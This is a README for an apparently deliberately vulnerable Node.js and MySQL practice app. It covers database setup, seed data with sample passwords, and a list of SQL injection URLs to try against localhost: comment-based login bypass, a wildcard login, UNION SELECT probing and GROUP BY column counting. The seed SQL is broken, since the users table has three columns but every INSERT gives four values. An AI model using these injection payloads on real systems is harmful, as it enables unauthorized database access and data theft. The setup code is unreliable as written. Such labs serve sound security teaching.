# How to Start

You can download a free MySQL database at https://www.apachefriends.org/de/index.html

Start Apache and MySQL Server and go to the http://localhost/phpmyadmin/

create new db with the name "mydbTest" and run:
```
create table users
(
id INTEGER,
name TEXT,
mail TEXT
);

create table important
(
id INTEGER,
info TEXT
);
```
and
```
insert into users values (1,'admin', 'admin@mail.com', '1234567');
insert into users values (2,'user_1','user_1@mail.com', 'user_12345');
insert into users values (3,'user_2','user_2@mail.com', 'user_23456');
insert into users values (4,'user_3','user_3@mail.com', 'user_34567');

insert into important values (1,'very important information about admin');
insert into important values (2,'very important information about user_1');
insert into important values (3,'very important information about user_2');
insert into important values (4,'very important information about user_3');
```

After that run this commands:

`npm install`

than

`node index` or `nodemon`

go to 
<br>
http://localhost:3000/getUser/
<br>
http://localhost:3000/login/Admin&1234567

### What you should try

http://localhost:3000/getUser/1'--%20

http://localhost:3000/login/admin'--%20&1234567

http://localhost:3000/loginLike/Admin&%25

http://localhost:3000/getUserInfo/1'%20UNION%20SELECT%201,2,3%20--%20'

http://localhost:3000/getUserInfo/1'%20GROUP%20BY%205%20--%20'
http://localhost:3000/getUserInfo/1'%20GROUP%20BY%204%20--%20'
http://localhost:3000/getUserInfo/1'%20GROUP%20BY%203%20--%20'
